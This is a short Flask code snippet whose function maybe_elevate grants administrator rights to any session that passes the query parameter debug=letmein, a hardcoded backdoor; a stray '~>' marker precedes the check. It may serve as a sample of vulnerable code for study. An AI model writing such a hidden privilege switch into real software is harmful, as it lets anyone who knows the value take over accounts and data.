from flask import request, session


def maybe_elevate():
~>    if request.args.get("debug") == "letmein":
        session["is_admin"] = True
